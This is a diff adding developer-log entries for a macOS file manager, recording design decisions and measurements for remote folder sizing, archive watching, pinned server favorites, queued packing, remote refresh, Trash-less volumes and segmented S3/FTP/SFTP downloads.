+**Verified in the running app against that server, and the control is what makes it a
+measurement.** A seeded session tab reconnected at launch, ⌃B on the eight-row remote listing drew
+real bars (79–107 KB, summing to the fixture's 748 654) and cost **9 sessions**. The same build
+against the same tree with `ForceCommand internal-sftp` — the exec channel withdrawn, so the
+shortcut answers `nil` — drew the **identical** bars and cost **149**: eight refused execs plus the
+136 listings. So the degradation is right and the shortcut is unambiguously what does the work.
+The archive half was verified the same way, by hand, including a tree expanded inside the zip where
+an only child correctly fills its own level's bar.
+
+**Three smaller things the slice needed.** A **row the allowance never reached** is a refusal rather
+than a walk that has not landed, and those look identical — both leave a dash — so the queue
+publishes them (`DirectorySizeProvider.gaveUpKey`) and the pane routes them into the marker and
+tooltip Space-on-dir's own give-up already draws, localized in fourteen languages. The allowance is
+**carried across a re-request**, because the pane re-requests on every render and seeding afresh
+each time would be a metronome rather than a budget; and a set that gave up is *remembered*, or the
+exhausted rows — pending forever, having no total — would be re-queued and re-granted on each
+repaint. Bounded scans run **one walk at a time**, which is what makes the allowance exact and is
+independently right: a stock OpenSSH server starts dropping connections at ten concurrent
+unauthenticated ones, as this project's own live suites have already been bitten by.
+
+**Two hazards the slice created and one it merely found.** Making `cancelScan` abandon the walk in
+flight is right for the pane saying it stopped looking and *wrong* for the queue saying it has
+nothing more to hand out — and those went through one function. Since a bounded set runs one walk at
+a time, "nothing left to queue" is exactly the state a re-render reaches while the **last** child is
+being walked, so the merged version abandoned the row the user was waiting for, on every repaint,
+whenever the race went that way. Split into `clearQueuedWork`, and pinned: the control fails 3/3 and
+its sibling — the pane genuinely leaving, which must still abandon — stays green. The second was a
+leaked slot: a drain unwinding under cancellation could leave `boundedWalk` set, which blocks every
+bounded scan for the life of the process, since blocking is what it is for.
+
+**And the one it found was already there.** `startDraining` guards on a handle its own task clears
+*after* `drainQueue` returns — several main-actor turns later, because a task group unwinds — so a
+request landing in that window is queued behind a task that has stopped looking. The app heals
+itself, because the pane re-requests on every render; a test that asks once does not, and this one
+failed about a run in three until the handle was cleared before a re-check. A defect nobody can
+report is still a defect (docs/NOTES.md ▸ Design lessons).
+
+**An archive's wake had to widen, too.** A pane inside a zip watches the **container file**, so its
+event says the whole archive was rewritten — and every inner path keeps the same
+`archive:<on-disk path>` identity across a repack. Invalidating only the pane's own root-to-leaf
+line would have left a sibling folder's total banked against an archive that no longer exists: the
+mount is re-read on `ArchiveIdentity` and the rows come back correct while the number beside them
+does not. Nothing else could widen it — the caller is handed the listing path, and `DirectoryWatcher`
+discards the event's paths.
+
+**2026-09-01 — an archive pane notices its own file changing.** The last of PLAN.md §4's small
+cuts, and the smallest: the *answer* had shipped at M4 and been tested since — every mount is
+stamped with an ``ArchiveIdentity`` (device, inode, size, mtime) and `CompositeBackend.mountedArchive`
+re-reads the table of contents the moment that stops describing the file — while nothing ever put
+the question. `startWatching` returned early for any backend but `.local`, so a browsed `.zip` was
+re-read only when a navigation, a tab switch or a write Dirnex made itself happened to ask. A
+`.zip` repacked in another window went on listing its old members for the life of the pane.
+
+**The flag is the whole finding, and a file stream without it fails in the quiet direction.**
+Probed before any Swift, against a real stream: a path handed to FSEvents *without*
+`kFSEventStreamCreateFlagFileEvents` reports only that path appearing and disappearing — a
+delete-and-repack fired, a rename fired, and an archive **rewritten in place** fired **zero** times.
+That last is exactly the case the identity's size and mtime fields exist for, so the natural
+spelling would have covered the loud half of the problem and left the quiet half looking fixed. With
+the flag, all four shapes fire.
+
+**Two more measurements chose the file over its enclosing directory**, which also sees everything
+and was the obvious alternative. The stream is keyed to the **path**, not to an inode, so it
+survives the file being deleted and recreated under the same name and goes on reporting writes to
+the new one — which is the ordinary way to redo an archive, i.e. the main case. And it is silent for
+siblings: a sibling created, written five times, and written again after a repack produced **0**
+callbacks on the file stream against one apiece on the directory. So a pane sitting inside an
+archive in a busy Downloads folder pays nothing for the churn around it.
+
+**Tree mode had the same hole for a different reason and got the same stream.** `treeWatchSources`
+drops every path FSEvents cannot watch, and every directory a tree rooted in an archive lists is an
+`archive:` path — so the set came out empty and the watcher was torn down, meaning switching to tree
+mode inside an archive silently cost the pane its refresh. One file answers for every row of such a
+tree, so both modes arm the identical stream and `watchedSources` records the archive file, which is
+what keeps the set comparison matching and the stream from being rebuilt on every refresh.
+
+**The control found a bug in the test helper rather than in the product, which is why it is worth
+recording.** With the flag removed the three new file tests did not fail — they **hung**, past seven
+minutes, while the five directory tests passed in under 0.1 s. `Pulse.wait` raced a sleeper against
+a `withCheckedContinuation` in a task group and returned `false` on time, then waited for the group
+to drain a continuation nothing would ever resume (a continuation carries no cancellation, ▸ NOTES
+Swift 6 and concurrency). Every event these tests wait for does arrive, so it had never shown; the
+first run that withheld one turned a reporting instrument into a hang, which reads as broken
+infrastructure rather than as the regression it was reporting. Resuming the *same* continuation from
+the timeout fixes it, and the control then failed the three file tests in 10.5 s naming the in-place
+rewrite each time, with the five directory tests still green.
+
+**The narrowness control needed a drain, and its first two versions were flaky in the reassuring
+direction.** "A sibling does not wake this stream" was read as a count, and the count kept coming
+back 1 — not from the sibling but from the *setup's own* write, since FSEvents' "since now" is
+approximate at the edges and a single write can arrive as more than one callback, so a reset taken
+on the first of them is overtaken by the rest. A quiesce until the counts stop moving, and then
+three sibling rounds, is green 22 consecutive runs against a 1-in-5 flake before it.
+
+**Verified end to end, in a checked-in test rather than by hand, because the gesture cannot be driven
+from outside the app**: session restore is `.local`-only, so a tab cannot come back inside an
+archive, and nothing in the `.sdef` or `CommandBinding` enters one. A real pane lists a real zip, the
+zip is repacked by another process, and the pane's rows follow with **no gesture at all** — the whole
+shipped path, stream to `installSortedModel`. Reverted, it fails on the pane still listing the
+archive that is no longer there, which is the user-visible bug verbatim. 3065 core tests and 953 app
+tests green, the app suite 4/4 and unchanged in wall time from its 952-test baseline.
+
+**2026-09-01 — a pinned folder on a server comes back.** A `FavoriteEntry` was a `VFSPath` and
+nothing else, so pinning a folder on a connected account produced a sidebar row that survived the
+quit and could never be opened again: a `VFSBackendID` is the account's *descriptor* — host, user,
+port, region — and says nothing about the auth method, or about an FTPS certificate the user chose to
+trust. That is the gap session restore closed on 2026-08-27 (below), so the fix is the same field one
+type along — and `StoredServerEndpoint` rather than a bare `ServerEndpoint` for the reason that type
+exists: the pins are one array in one blob, and an enum with associated values throws on a case a
+newer build wrote.
+
+**Nothing had to be built to reconnect, which is what kept it a field rather than a feature.** The
+seam is `navigate` — it asks `canListAfterReconnecting`, which registers whatever endpoint the tab is
+carrying — so a pin only has to *record* one, and it inherits the credential rules, the "a gesture
+connects at any refresh floor" rule, and the region-301 and path-style corrections having nothing
+left to correct on a path an earlier connect settled. The endpoint is weighed against the path
+through the same `TabRestorePolicy` a restored tab uses, rather than trusted on sight: two fields of
+JSON in a defaults domain could name different servers, which would connect to one account and list a
+path belonging to another — a plausible listing under the wrong name.
+
+**What needed the care was that a pin has four surfaces and only one of them held the endpoint.** The
+⌘F popup carried `entry.path` in its menu item, the sidebar reduced `.favorite(entry)` to
+`didActivate: path`, and that row's own Open item spelled the same handover a third time — one rule,
+three spellings, which is this file's most repeated bug. All three now go through one
+`jumpToFavorite`, and the *recording* is split out of it (`recordPendingConnection`) for the reason
+`AlertKeyCatcher.button(for:)` is split from the click it decides: the act is a navigation, so a test
+driving the whole gesture against a server fixture would spawn a real `sftp` at a host nobody owns.
+Three controls, each firing on exactly one test — a pin that captures nothing, a jump that records
+nothing, and the field as a bare `ServerEndpoint`, whose decode **throws** inside
+`FavoritesStore.load()`'s `try?` and takes the user's entire Favorites section with it. Still
+deliberately undone: dragging a remote folder into the sidebar (§M8's omission), and any pin made
+before the field, which carries no way back and fails as it always did.
+
+**2026-08-30 — ⌥F5 packs a folder off a server, and every pack is a queue job.** Two cells from
+PLAN.md §4's *Still open* list, closed together because they are the same gesture: packing refused
+a folder that is not on this disk, and a plain pack had no bar and no Stop for its upload.
+
+**The refusal's own advice was the implementation.** It told the user to *"copy it over with F5 and
+pack the copy"* — and `CopyEngine.preScan` has sized remote directories through `DirectorySizer`
+since M5, so F5 on a remote folder already paid a recursive walk for its denominator. So
+`MaterializeRunner` grew a directory branch that hands the folder to that engine, and packing one
+now costs exactly what the user was being told to spend by hand. Two properties keep it honest: a
+staged tree is **not adopted** into `RemoteFileCache` (a directory's staleness cannot be read off a
+size and a date, and a tree can be gigabytes held for the session), and a **partial tree fails the
+whole source** rather than packing quietly short — the shape M24 Slice 6 had to fix once already.
+The confirmation needed nothing: `MaterializationPlan.totalsAreExact` has answered `false` for a
+pending directory since it was written, with the sentence to match, and its doc comment named this
+slice as the gesture that would build on it.
+
+**`bsdtar` answers SIGINFO, which is what made the queue affordable.** The tool prints no progress
+and no flag turns one on, so a plain pack had been a spawn on the app's own thread since M4 — the
+libarchive split was about the *passphrase*, never about the work. Probed first: signalled, it writes
+`In: 3 files, 42894848 bytes; Out: 32440320 bytes` to stderr and carries on at exit status 0, over a
+real **pipe** rather than a terminal (where `sftp`'s meter cannot be had at all), and SIGTERM stops
+it promptly leaving a partial to sweep. So the bar's numerator is *bytes read*, which is the same
+quantity the walk measures in advance — the archive's own growth could not serve, its denominator
+being a compression ratio nobody knows until the end. `FileOperation.Kind.plainPack` and
+`PlainPackRunner` are the core half, `BsdtarProgress` parses the answer, and `ArchivePacker` — now
+`PlainPackWriting` — spawns, signals every fourth poll and terminates on Stop. `PackDelivery` was
+lifted out of `PackRunner` so both packs share one definition of *what the bar sees while the
+archive goes to a server*, and the queue's dispatch moved to `FileOperationQueue+Runners` on the file
+ceiling. Taken at open by the user: **every** ⌥F5 queues, including a local one, rather than keeping
+two paths through one gesture.
+
+**Verified live, and the live run is what found the one real bug.** Against a throwaway `sshd`: a
+two-level remote folder staged and packed, with the deep file's bytes read back out of the archive by
+`bsdtar` itself — after a first run failed `pathOutsideConnection` before staging anything, because
+**a tree needs a routing backend where a file does not** (`CopyEngine` writes on the destination side;
+a bare `SFTPBackend` refuses the local temp path). The app always holds a `CompositeBackend`, so
+production was never wrong and the test was. The other two claims were measured against the real tool:
+a 200 MB pack reported **5 progress samples** (29 MB → 150 MB read, naming the live member) across
+2.68 s, and a Stop at 0.5 s returned at **0.51 s** with no archive left behind. Headlessly, the folder
+half is controlled by neutering the branch — 4 of 6 tests fail, the file case and the narrowness
+control staying green — and the app suite keeps only what a sheet lets it see, which is that the pack
+sheet goes up where a refusal used to.
+
+**2026-08-26 — a pane on a server keeps itself current, and the first gap in
+LOCATION-SUPPORT.md closes.** *"No live refresh on a server. A file added by somebody else never
+appears until the folder is re-listed by hand"* headed that document's ranked list of what still
+feels unlike local. No remote protocol here can fix it — SFTP has no `inotify`, FTP has no verb, and
+S3 has no session to hold a notification open on — so the only way to learn that a folder moved is
+to ask again, and the whole design is about asking as little as will do.
+
+**A duty cycle rather than a table of intervals**, because the quantity that varies is the *folder*
+and not the protocol: an S3 listing pages at 1000 keys, so a 50 000-object prefix is fifty billed
+requests and ~32 s where an ordinary folder is one request and 0.65 s, and a tree re-lists every
+expanded level. `RemoteRefreshPolicy` therefore derives the gap from **what the previous refresh
+actually cost**, holding a pane to ~5 % of its wall time — so an expensive folder backs off by
+itself, on a slow link as much as on a large prefix, with no per-backend row to keep. For everything
+a person browses the ceiling is slack and the **floor** decides, which is why the floor is the one
+number in Settings ▸ Panels and `0` is a real setting: *never contact a server unasked*. The same
+division `DirectorySizeBudget` already draws — the budget is not the patience limit, it is what stops
+a runaway billing indefinitely.
+
+**Whether anybody is looking turned out to be one property.** Probed on a live window: `NSWindow
+.occlusionState` goes false for miniaturized, app-hidden, ordered-out **and covered by another
+window**, while `isVisible` stays true through the last of those — the commonest case and the one
+everybody reaches for first. The same probe caught the trap that `didBecomeActive` fires *before*
+occlusion updates, so the poll arms from the occlusion notification and never from activation.
+App-*activity* is deliberately not a second gate: a pane beside the user's editor showing rows that
+are quietly out of date is the bug being fixed, and it is still being read.
+
+**One refresh, two wake sources.** The poll re-uses `performListRefresh` / `performTreeRefresh`
+rather than growing a second re-list that would drift, and the two differ on exactly one thing,
+carried as a `RefreshWake`: an FSEvents ping is itself proof that something under the directory
+changed, where a poll knows only what two listings disagree about — so only the event may evict
+cached folder totals unconditionally. Inert today (a remote path never reaches
+`DirectorySizeProvider`) and gated anyway, since the day a budgeted remote walk banks a total there,
+an ungated poll would drop a ten-minute answer every fifteen seconds with nothing to say why. The
+existing "only when the listing actually moved" guard is what makes the whole thing affordable: a
+server asked every fifteen seconds answers *the same rows* nearly every time, and that costs one
+request and no repaint.
+
+**Verified against a real server, and it is what found the bug.** A throwaway unprivileged `sshd` on
+port 2229, a saved connection seeded into the defaults domain so reaching a remote pane was one
+sidebar click, and the app run from a shell with a short-lived `NSLog`. A file created from the
+shell — genuinely somebody else — appeared in the SFTP pane 4 s later with no key pressed, beside a
+local pane on the same directory that had it instantly from FSEvents; hiding the app logged one
+`stop` and then nothing at all for two intervals. What the run caught was the catch-up: a pane
+uncovered after 25 s waited out **a fresh interval** instead of refreshing at once, because the
+timings it subtracts were cleared whenever the armed path changed and `stopRemoteRefresh` nils that
+path. Keyed by the path they describe, the same run reads `fire after 0.0s`. Nothing headless could
+have seen it — no test arms a timer — so the arithmetic moved into `RemoteRefreshPolicy.delay`,
+where reverting it fails four assertions. See docs/NOTES.md ▸ AppKit.
+
+The pass also paid three lint ceilings the feature crossed, by concept rather than by shaving:
+`navigate` joined the small navigation actions it is the funnel for, the tree's watcher and re-list
+became `PanelViewController+TreeRefresh` beside list mode's `+Watch`, and `AppPreferences` gave up
+its defaults-key vocabulary and its palette. Both new Settings strings were measured across all
+fourteen catalogs before shipping — French ran 24 pt past the widest label already on that tab, and
+the shortened set clears it by 96 pt.
+
+Running `scripts/check_localization_keys.py` for the new strings also surfaced one that was already
+failing it: **"Couldn't copy this item from the server"**, the alert title a failed drag of a
+server's file out to another app raises, had shipped with M23 wrapped in `String(localized:)` and
+absent from the catalog — so it rendered English in thirteen languages, which is exactly the
+silent-by-construction class that script exists to catch and the reason it is a CI step rather than
+a test. Added in all fourteen, in the register of its two siblings on the same funnel
+("Couldn't open this item" and "Couldn't open this item for editing") rather than as three
+translators' guesses, and read back out of the **compiled** `.lproj`s rather than trusted from the
+catalog. The script now reports 912 extracted keys, all present.
+
+**2026-08-25 — the same refusal, swallowed by a `try?` in two flows that then report success.**
+The entry below fixed F8 and recorded its other two callers as still open; this closes them.
+`removeArchiveMoveOriginals` (the F6 move into an archive) and `runSyncDeletes` each trashed their
+items through a `try?`, so on a volume that keeps no Trash the refusal removed nothing and said
+nothing: **F6 silently meant F5** — the archive held the items and so did the folder they came
+from — and a directory sync finished claiming a mirror it had not made, having promised the Trash
+by name in the confirmation it showed up front. Neither is reachable from F8, so neither inherited
+its fix.
+
+**A `try?` cannot tell "it worked" from "it was refused" from "it failed", and the three need
+opposite answers** — which is what made one line the whole defect. `DeletePass` is now the single
+loop all three flows run, F8 included, returning them apart: `restorations` to journal, `refused`
+to *ask* about, `failures` to report. It never throws, since one item's outcome must not abandon
+the rest of a batch. The rule generalizes past deletes: a `try?` is only honest where the caller
+genuinely does not care which of the three happened, and a delete is never that caller.
+
+**Each flow's answer had to be its own, and the shape of the gesture decides it.** F6's originals
+are already inside the archive when the refusal lands, so declining is a good outcome (a copy)
+rather than a lost one — it offers the permanent delete that would finish the move, and **says so
+when declined**, since a move quietly meaning something else is the defect itself. That report is
+the status line rather than a second sheet (nothing failed, and the user has just answered a
+question), one sentence with no interpolated name: measured 310 pt for the single form (ja) and
+332 pt for the plural (ru, three-digit count) across all fourteen catalogs, against the ~542 pt
+that label gets, because it truncates its *tail* in silence and the tail is where an explanation
+lives. A sync's refusals instead arrive one per item inside a batch that may span hundreds, and
+cannot be anticipated, so they are collected and asked about **once at the end** — which costs
+nothing, because a refusal moves nothing and every refused item is still there when the sheet goes
+up. Both answers re-run the same pass with `permanent: true`, and neither can raise a second
+question: `removeItem` consults no Trash, so `.unsupported(.trash)` cannot arise there — asserted
+rather than assumed, since a backend answering otherwise would loop the sheet forever.
+`TrashRefusal` moved into the core beside `DeletePass`, `offerPermanentDelete` became the one
+sheet all three flows raise (the refused paths handed back to its `confirmed` closure, so the
+delete cannot act on a different set from the one the sheet counted), and
+`presentDeletionFailures` the one report.
+
+**Covering it turned up two test-host traps, both now in NOTES.md.** Tearing a window down while a
+sheet it had carried was still settling segfaulted the runner — `EXC_BAD_ACCESS` in `objc_release`
+under `-[_NSWindowTransformAnimation dealloc]`, from a Core Animation transaction committing
+inside the *next* test's run-loop spin, so of seven serialized tests the two that crashed were #4
+and #7 while the sheets belonged to #3 and #6, and xcodebuild then listed whatever was in flight
+under "Failing tests:", naming features that work. Waiting for `attachedSheet` to go `nil` first
+is not enough (the crashing tests already did that); the probe simply never tears down, retaining
+its windows for the life of the process. And a doc comment written between `@MainActor` and
+`@Suite` discovered **zero tests** while reporting success —
+`✔ Suite "…" passed after 0.001 seconds` — with no warning anywhere, which invalidated a
+measurement taken while it was in place.
+Nine core tests over `DeletePass` and seven app tests over the two new flows, each with the
+narrowness control that keeps "don't report a refusal as a failure" from becoming "don't report
+failures" (a real failure is never turned into an offer to delete for good; a sync that trashes
+normally asks nothing).
+
+**2026-08-25 — F8 on a network share reported *"The system reported an error (code 3 328)"*.**
+Reported by a user deleting from a mounted SMB share on a NAS. `FileManager.trashItem` refuses
+outright there — the volume keeps no Trash — and Cocoa says so as `NSFeatureUnsupportedError`,
+which `LocalBackend.mapCocoaError`'s `default` branch rendered as `.io(code: 3328)`: a number, for
+a volume that is working perfectly and simply cannot do the one thing that was asked. **The same
+code means nothing two lines away**, which is the trap it turns on:
+`FileManager.url(for: .trashDirectory, appropriateFor:)` throws it for a volume that trashes fine
+and merely has nothing trashed on it yet — measured again on freshly created **ExFAT and HFS+**
+images, both of which threw it from the lookup and then trashed happily into
+`<volume>/.Trashes/501`. So 3328 from the
+*lookup* is noise and 3328 from the *attempt* is the verdict, which is why `trashFailure(_:path:)`
+is named apart from the shared mapper rather than added to it.
+
+**There is no pre-check, so `capabilities(for:)` cannot be taught this.** Probed: no
+`VOL_CAP_FMT_*` or `VOL_CAP_INT_*` bit names a Trash, and no `URLResourceKey`/`kCFURL*` does
+either — the `volumeSupports…` family covers cloning, renaming, immutable files and a dozen more
+and stops short of this one. The attempt is the only instrument there is, which is why the
+degradation happens *after* the refusal rather than in the capability set the way SFTP's, FTP's
+and S3's do. What it degrades to is what those three already get: the confirmed permanent delete —
+**offered, not performed**, since nothing has moved when the refusal arrives, so it is a genuine
+question and declining leaves the files exactly where they are. The question itself is the
+ordinary permanent-delete one, already translated in all fourteen languages; only the *reason* is
+new (“There’s no Trash on this volume, so this can’t be undone”), which is the shape Finder's own
+share dialog has.
+
+**Read the outer code before the underlying errno**, which is the reverse of what the shared
+mapper does. A 3328 carrying an `NSPOSIXErrorDomain` `ENOENT` underneath is real — the lookup
+produced exactly that shape on both probe volumes — and letting the errno win reports a Trash-less
+volume as *"not found"*, a second wrong answer wearing a more plausible sentence. Nothing is
+swallowed by that ordering: `trashItem` reports a genuinely missing file as
+`NSFileNoSuchFileError`.
+
+The SMB half is the **report** rather than a measurement taken here — no share was mountable on
+this Mac, and no disk image can stand in for one, since every filesystem `hdiutil` makes trashes.
+Everything on this side of the syscall was measured. Five core tests pin the mapping (the verdict
+is named rather than numbered; the feature code wins over an errno tucked under it; every other
+trash failure keeps the mapping it had; an errno is still recovered when the outer code is *not*
+the verdict; the volume refusal is distinct from the already-inside-a-Trash one), and three app
+tests drive the real sheet on a real window — it appears, its default button performs the
+permanent delete, and a genuine failure is never turned into an offer to delete for good. The two
+`try?` callers this could not reach were recorded as still open, and are the entry above.
+
+**2026-08-24 — and SFTP, which needed a different route entirely.** The third of three, and the only
+one where the *shape* the first two share was unavailable: the system `curl` is built without libssh2
+— its protocol list carries no `sftp` and no `scp` — and `sftp(1)` has no range verb at all (`get -a`
+resumes to EOF, with no way to stop). So there was nothing to hand a list of ranges to, and the
+question was whether to build it another way at all. Put to Oleg as a fork with the measurements
+attached; the answer was to build it.
+
+**A segment is an SSH exec channel**, which is the second thing this project asks an SSH account to
+do after §M22's subtree search. `/usr/bin/env tail -c +N '<path>' | /usr/bin/env head -c M`, and each
+of those three choices was probed rather than assumed: `tail`+`head` over `dd` because only the
+pipeline is exact *by construction* (`dd` does one `read()` per block and BSD has no
+`iflag=fullblock`, so a short read gives a short piece — it happened not to here, which is exactly
+the kind of luck not to build on), `tail -c +N` **seeks** (the same 8 MiB piece of a 256 MiB file
+took **0.31 s at offset 1 and 0.28 s at offset 224 MiB**), and `env` on both halves because an exec
+channel runs the user's login shell with their rc sourced, where a function shadows a binary —
+measured, a `dd() { echo SHADOWED; }` did.
+
+**Two things about this route report failure badly, and both shape the design.** A pipeline's exit
+status is its *last* stage's, so a `tail` that cannot open the file is masked by a `head` that exits
+0 — measured, a missing remote path gives `ssh` exit **0** and a **zero-byte** piece. And an account
+confined to the `sftp` subsystem has no exec channel at all: it answers *successfully* with the
+sentence "This service allows sftp connections only." on **stdout**, which is where a piece's bytes
+go — so a refusal arrives as a 43-byte file rather than as an error. Nothing but a piece's **length**
+separates either case from a real download, which is what makes `SegmentAssembly`'s length check
+load-bearing here rather than defensive, and why a segmented SFTP download never diagnoses anything:
+it succeeds, or it hands over to the plain `sftp` download whose error is the one worth reporting.
+
+**The concurrency the other two avoided lands here, and it is smaller than it looks.** There is no
+multi-transfer driver for SSH, so four `ssh` children run at once — the shape the S3 design rejected.
+What keeps it modest is that **nothing is piped**: each child's stdout is its own piece and its stderr
+a small file beside it, so there is no pipe that can fill and no drain to run, and the two-pipe
+deadlock this project documents everywhere else has no shape here. What is left is four spawns joined
+into one `DispatchGroup`, one `ProcessWaiting.wait` for all of them, and one `terminate()` each on
+cancel.
+
+The limits get their own table (`SegmentedDownloadLimits.sftp`, 16 MiB / 8 MiB / 4) even though the
+numbers equal FTP's today, because the reasons do not: a segment here costs a key exchange *and* an
+authentication, and four leaves room under OpenSSH's `MaxStartups`, whose default throttles above ten
+unauthenticated connections. `FTPSegmentedDownload` became the shared `SegmentedDownloadOutcome`,
+since the two protocols whose answer is a byte count now both use it — S3 keeps its own, whose
+sections carry statuses worth attributing. The POSIX quoting `SSHFindCommand` had was hoisted to
+`SSHShellQuote`, because two commands now send a stranger's path to a shell and a second spelling of
+that rule is how one of them gets a weaker one.
+
+Verified live through the real `CompositeBackend` → `SFTPBackend` → `SFTPProcessTransport` → four
+`ssh` children: 32 MiB **byte-identical**, progress summing to exactly 33 554 432. On an
+`internal-sftp` server, two downloads cost **6 sessions with the latch and 10 without** — four doomed
+plus one fallback for the first file, then one for the second — with both files byte-identical. Six
+headless controls fire on their own assertions: a zero-based `tail`, dropping `env`, leaving the path
+unquoted, reporting a refusal instead of falling back, removing the latch, and giving SFTP S3's
+limits. **Uploads stay whole** on all three backends, and here it is not even expressible: a segment's
+route is the server *reading* a range, and nothing symmetrical exists for writing one.
+
+**2026-08-24 — FTP downloads split too, over four logins rather than eight requests.** PLAN.md had
+this as a *separate decision* rather than a follow-through, on the grounds that each segment is a
+fresh login and many servers cap concurrent ones — so it opened with six measurements against a real
+`pyftpdlib` server, and four of them changed the design rather than confirming it.
+
+**It works, and the wire says how.** Eight sections of a 40 MiB file came back as eight exact pieces
+that reassembled **SHA-256 identical**; the server logged **eight control connections and eight
+logins**, all opened within about a millisecond, each sending its own `REST` + `RETR`. So a segment
+really is a login, which is the fact the rest of the design hangs on. Throughput, alternating rounds
+on a 32 MiB file with a 4 MB/s per-connection cap: **1 stream 16.02 s, 4 segments 4.01 s, 8 segments
+2.01 s**, 3/3 each.
+
+**A section tells you almost nothing, which is the opposite of the S3 half.** One *successful* run
+reported `225` and `226` mixed across its sections — a range download closes the data connection
+early, so whichever reply `curl` saw last is what it reports — and a failed section reports `221`,
+the goodbye. One `curl` carrying N transfers has **one** exit code. So there is no per-section
+classification to read at all: the only per-section fact is the file that landed, checked against its
+range by the assembly that was already there. That also retires two flags the S3 invocation carries —
+no `--fail` (FTP writes no error document; a refused `RETR` creates nothing, measured) and no
+write-out (there would be nothing worth reading, and having one would invite somebody to read it).
+
+**A server that caps concurrent connections does not degrade — it fails the run.** With a cap of 2
+and eight sections, two completed and six were refused `421`. That is the commonest way this can
+fail, it is invisible to the user, and no error message would help them with somebody else's
+connection limit — so **any** failure falls back to a single stream, silently, which is what worked
+before. The retry reports no further progress, or one file would be counted twice in a job total that
+only adds.
+
+**And the fallback is not free, so the connection remembers.** Those two completed sections were a
+quarter of the file, downloaded and thrown away — a price that without a latch is paid again for
+every file. `SegmentedDownloadSupport` latches on a rule narrower than "the run failed": *the server
+served us something and it still failed*. A missing file serves nothing, and latching on that would
+cost every later download its fast path for one absent name. Measured live on a capped server, two
+downloads on one connection: **4 logins and 1 `REST` with the latch, 6 and 2 without**.
+
+**The core is now one implementation with two policy tables.** `S3DownloadPlan` became
+`SegmentedDownloadPlan` and `S3SegmentAssembly` became `SegmentAssembly`, with the constants moving
+into `SegmentedDownloadLimits.s3` (8 MiB, 4 MiB, 8) and `.ftp` (**16 MiB, 8 MiB, 4**) — twice the
+threshold and half the ceiling, because a segment costs a login rather than a handshake and because
+four sections meet fewer caps than eight. Two copies of that arithmetic is the bug this file writes
+essays about; two tables is the honest difference. The same reasoning gave the S3 side the latch it
+was missing, where an endpoint answering a range request with the whole object costs **every** section
+the whole object.
+
+Verified live end to end through the real `CompositeBackend` → `FTPBackend` → `FTPCurlTransport` →
+`curl`: 32 MiB byte-identical in **4.05 s** against the single stream's 16.02 s on the same throttled
+server, progress summing to exactly 33 554 432; and on the capped server, 2 doomed logins + 1
+fallback producing a byte-identical file. Six headless controls fire on their own assertions —
+dropping `--parallel-immediate`, dropping the per-section TLS half (which is what stops a segmented
+download quietly losing `--ssl-reqd` or a certificate pin), reporting a refusal instead of falling
+back, removing the latch, latching on *any* failure, and giving FTP S3's limits.
+
+**2026-08-24 — and a download's ranges go eight at a time.** The upload half's mirror image, and the
+design PLAN.md §4 had carried since 2026-08-20 without anyone building it: a download was one `curl`
+and therefore **one TCP connection**, on a link that gives far more. Measured on this project's own
+account, alternating rounds over one whole object: **1 segment ~36 s** (26.6, 35.2, 36.0, 46.7),
+2 → 7.8 s, 4 → 7.0 s, **8 → 5.4 s**, with 8 winning every round — about **6,7×**. Nothing was
+throttled and nothing was wrong; the app's exact argv measured identical to a plain `curl` on the
+same object. What started it was a user reporting a 28,5 MB object taking most of a minute to
+preview.
+
+**One `curl -Z` with an N-section config on stdin**, exactly as the upload batch does, so again
+nothing new is concurrent in Swift: one child, both pipes drained, the wait bounded, and one
+`terminate()` on Stop stopping every section. Each section carries its own `range`, `output`,
+credential and **`fail`** — that last one because `output` writes whatever the server sends, so
+without it a refused section would save an `<Error>` document into a piece that assembly would then
+splice into the middle of the user's file. The alternative was probed and does work (N processes
+each writing into one destination at its own offset through a seeked `FileHandle`, byte-identical
+result) and was not taken: it needs concurrent orchestration, N stderr drains, per-segment meters,
+and a sparse destination whose size has stopped being the byte count.
+
+**`--parallel-immediate` was re-measured on this side rather than inherited, and it is the same
+finding again**: without it `curl` runs the first transfer alone before starting the rest. Live
+against `Tooling/fake-s3-endpoint.py` (which grew `Range` for the purpose, and logs each range's own
+start and end): **with** the flag, all eight ranges of a 40 MiB object opened within **98 ms** of one
+another and the download took **0.45 s**; **without** it, segment 1 ran alone from +0.000 to +0.306
+and the other seven started at +0.316, for **0.72 s**. Two rounds instead of one, at no visible
+symptom.
+
+**Progress is exact and free here, which is the one place the two halves differ.** A batch of uploads
+has only its own write-out lines to read; a batch of downloads is writing several files on this
+machine, so their combined size is the byte count. The total rides along as a **cap** rather than a
+target, for a reason the live control then produced on demand: an endpoint that answers a `Range`
+request with the whole object writes every section a full copy, and the queue's tally only ever adds.
+The answers are still read from **indexed** labels (`s3-seg<n>-status=`), sharing one mechanism with
+the parts' (`S3IndexedWriteOut`) rather than a second copy of it — one stream, several transfers,
+labels that carry their own identity.
+
+**That 200-to-a-Range-request is the failure with no symptom, and it is why the transport verb
+answers which of two things it did.** `S3Response.isSuccess` is deliberately a *range* (a resumed
+download answers 206), so those eight copies all read as successes; the backend checks for **206**
+specifically, and on anything else returns `nil` rather than throwing — the older route produces the
+right file, so an endpoint that does not honour ranges should be slow here, not broken. Measured live
+with `IGNORE_RANGE=1`: eight 200s, then one plain `GET`, the file byte-identical and the bar reporting
+the object's size exactly once (the retry is deliberately silent, or one file would be counted twice
+in a job total that only adds). The protocol default forwards to the plain download for the same
+reason the upload batch's does — a single stream produces the identical file — and says so as
+`.whole(_)` rather than as an empty array, since "this transport could not split the request" must
+never look like a failure.
+
+**The size that decides all of it rides in and is never asked for.** `VFSBackend.copyFile` gained an
+additive `expectedSize:` spelling whose default forwards, because a `HEAD` before every download is a
+full handshake — ~0.5 s to first byte, since every `curl` re-signs and re-connects — which would
+roughly double the latency of the small files Quick View fetches constantly to answer a question that
+only matters above 8 MiB. Both real callers already hold the number from a listing they made
+(`CopyEngine`'s `entry.byteSize`, `RemoteFileCache`'s entry), and `RelayCopy` passes it to its
+download leg and deliberately not to its upload leg, whose staged file's own size cannot be stale.
+**`CompositeBackend` forwarding it is the one failure with no symptom at all** — the app holds a
+composite, so a hint that stopped there would leave every download on the single-stream default, with
+the same rows, the same bytes and nothing to report — which is the `subtreeListing` shape
+docs/NOTES.md already records, and why its test separates *routed* from *answered*.
+
+Three things given up on purpose, all argued rather than excused. **Resume goes on the segmented
+path**: a partial already on disk still takes the resuming route untouched (verified live — one
+`HEAD` and one plain `GET`, no ranges), and above the threshold with nothing on disk, restarting at
+6,7× costs less wall clock than resuming the remainder at 1×. **N requests instead of 1** on a verb
